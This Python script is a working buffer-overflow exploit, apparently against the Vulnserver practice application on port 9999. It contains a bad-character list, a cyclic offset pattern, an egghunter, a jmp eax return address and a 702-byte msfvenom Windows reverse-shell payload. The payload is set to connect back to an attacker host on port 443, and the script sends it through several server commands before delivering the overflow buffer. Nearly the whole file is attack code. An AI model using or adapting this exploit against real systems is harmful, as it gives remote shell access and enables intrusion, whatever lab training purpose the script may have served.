#!/usr/bin/python 
import socket
import sys
import struct

host= '192.168.1.179'
port = 9999

try:
	s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

except:
	print "socket() failed"
	sys.exit(1)

#\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6"
"\xb0\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#msfvenom -p windows/shell_reverse_tcp LHOST=172.19.13.3 LPORT=443 -f python -a x86 --platform windows -b "\x00" -e x86/alpha_mixed BufferRegister=EDI
#size: 702 bytes
shell =  "T00WT00W"
shell += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shell += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
shell += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
shell += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shell += "\x59\x6c\x49\x78\x6f\x72\x77\x70\x47\x70\x37\x70\x61"
shell += "\x70\x6c\x49\x58\x65\x74\x71\x4f\x30\x65\x34\x4e\x6b"
shell += "\x66\x30\x34\x70\x4c\x4b\x43\x62\x44\x4c\x4c\x4b\x31"
shell += "\x42\x75\x44\x6e\x6b\x74\x32\x65\x78\x34\x4f\x38\x37"
shell += "\x30\x4a\x75\x76\x34\x71\x49\x6f\x4e\x4c\x55\x6c\x65"
shell += "\x31\x61\x6c\x35\x52\x36\x4c\x45\x70\x7a\x61\x4a\x6f"
shell += "\x34\x4d\x65\x51\x6b\x77\x48\x62\x59\x62\x32\x72\x50"
shell += "\x57\x6c\x4b\x33\x62\x36\x70\x4e\x6b\x70\x4a\x45\x6c"
shell += "\x6e\x6b\x42\x6c\x77\x61\x72\x58\x78\x63\x47\x38\x75"
shell += "\x51\x58\x51\x46\x31\x6c\x4b\x76\x39\x55\x70\x77\x71"
shell += "\x39\x43\x6e\x6b\x42\x69\x42\x38\x69\x73\x35\x6a\x70"
shell += "\x49\x6e\x6b\x70\x34\x4e\x6b\x45\x51\x4e\x36\x55\x61"
shell += "\x6b\x4f\x4c\x6c\x4a\x61\x7a\x6f\x74\x4d\x75\x51\x59"
shell += "\x57\x56\x58\x4b\x50\x74\x35\x59\x66\x56\x63\x73\x4d"
shell += "\x58\x78\x47\x4b\x71\x6d\x74\x64\x73\x45\x49\x74\x43"
shell += "\x68\x4e\x6b\x36\x38\x45\x74\x66\x61\x4a\x73\x35\x36"
shell += "\x4c\x4b\x66\x6c\x70\x4b\x4c\x4b\x70\x58\x75\x4c\x53"
shell += "\x31\x7a\x73\x6e\x6b\x36\x64\x6e\x6b\x75\x51\x48\x50"
shell += "\x4d\x59\x37\x34\x54\x64\x34\x64\x73\x6b\x53\x6b\x51"
shell += "\x71\x46\x39\x30\x5a\x32\x71\x4b\x4f\x4d\x30\x71\x4f"
shell += "\x43\x6f\x73\x6a\x4c\x4b\x64\x52\x38\x6b\x6c\x4d\x51"
shell += "\x4d\x55\x38\x30\x33\x35\x62\x57\x70\x75\x50\x42\x48"
shell += "\x42\x57\x54\x33\x77\x42\x61\x4f\x53\x64\x71\x78\x32"
shell += "\x6c\x43\x47\x76\x46\x35\x57\x39\x6f\x4b\x65\x6c\x78"
shell += "\x5a\x30\x43\x31\x67\x70\x75\x50\x45\x79\x78\x44\x50"
shell += "\x54\x52\x70\x55\x38\x56\x49\x6f\x70\x42\x4b\x75\x50"
shell += "\x69\x6f\x78\x55\x66\x30\x70\x50\x52\x70\x46\x30\x73"
shell += "\x70\x70\x50\x51\x50\x32\x70\x52\x48\x4b\x5a\x34\x4f"
shell += "\x49\x4f\x6b\x50\x39\x6f\x4b\x65\x4c\x57\x30\x6a\x46"
shell += "\x65\x32\x48\x4c\x6c\x65\x43\x34\x4d\x43\x33\x73\x58"
shell += "\x73\x32\x55\x50\x37\x71\x6f\x4b\x6b\x39\x59\x76\x31"
shell += "\x7a\x66\x70\x61\x46\x62\x77\x51\x78\x4a\x39\x39\x35"
shell += "\x72\x54\x75\x31\x4b\x4f\x4e\x35\x4e\x65\x39\x50\x50"
shell += "\x74\x74\x4c\x69\x6f\x72\x6e\x57\x78\x43\x45\x5a\x4c"
shell += "\x71\x78\x58\x70\x6e\x55\x4f\x52\x53\x66\x69\x6f\x4a"
shell += "\x75\x52\x48\x53\x53\x72\x4d\x62\x44\x35\x50\x6b\x39"
shell += "\x6b\x53\x52\x77\x76\x37\x63\x67\x44\x71\x5a\x56\x73"
shell += "\x5a\x67\x62\x76\x39\x36\x36\x7a\x42\x39\x6d\x31\x76"
shell += "\x38\x47\x37\x34\x64\x64\x35\x6c\x66\x61\x45\x51\x4c"
shell += "\x4d\x70\x44\x75\x74\x32\x30\x5a\x66\x33\x30\x51\x54"
shell += "\x42\x74\x36\x30\x51\x46\x46\x36\x71\x46\x71\x56\x70"
shell += "\x56\x62\x6e\x43\x66\x46\x36\x33\x63\x36\x36\x63\x58"
shell += "\x34\x39\x78\x4c\x75\x6f\x6b\x36\x6b\x4f\x6a\x75\x6f"
shell += "\x79\x6d\x30\x52\x6e\x53\x66\x67\x36\x59\x6f\x30\x30"
shell += "\x30\x68\x43\x38\x4f\x77\x47\x6d\x45\x30\x4b\x4f\x69"
shell += "\x45\x4f\x4b\x78\x70\x6f\x45\x79\x32\x51\x46\x61\x78"
shell += "\x4f\x56\x6e\x75\x6f\x4d\x4d\x4d\x39\x6f\x6a\x75\x77"
shell += "\x4c\x76\x66\x51\x6c\x64\x4a\x6f\x70\x6b\x4b\x59\x70"
shell += "\x30\x75\x53\x35\x6f\x4b\x77\x37\x37\x63\x50\x72\x72"
shell += "\x4f\x53\x5a\x75\x50\x56\x33\x49\x6f\x39\x45\x41\x41"
pre="GTER "
#buf=pre+pattern#"A"*1010
#jmp eax 625011B1
jmpeax="\xb1\x11\x50\x62"
longjmp="\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1" #512 long jmp.bin
longjmp="\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1" #jmp 1024
buf=pre+"\x41"*2+"\x90"*(64)+egghunter+"\x90"*(149-64-len(egghunter))+jmpeax#+shell#"\x90"*16+shell+"\x90"*(1010-149-4-16-len(shell))

#buf=pre+"\x41"*2+"\x90"*(64)+egghunter+"\x90"*(149-64-len(egghunter))+jmpeax+"\x90"*16+shell

s.connect((host,port))
commands=['RTIME','LTIME','SRUN','TRUN','GMON','GDOG','STATS','HTER','LTER','KSTAN','KSTET'] #removed kstat as that seems to have a very small b uuffer, stats as resutls oin priv instruction
#commands=['Ltime','srun','trun','gmon','gdog','hter','lter','kstan'] #removed kstat as that seems to have a very small b uuffer, stats as resutls oin priv instruction

commands=['KSTET']
s.recv(1024)
for cmd in commands:
	s.send(cmd+" "+shell)
	print (cmd+" "+shell)
	s.recv(1024)

#s.se#d("LTER "+shell)
#s.send("GTER T00WT00W"+badchar)
#s.recv(1024)
s.send(buf)
s.close()
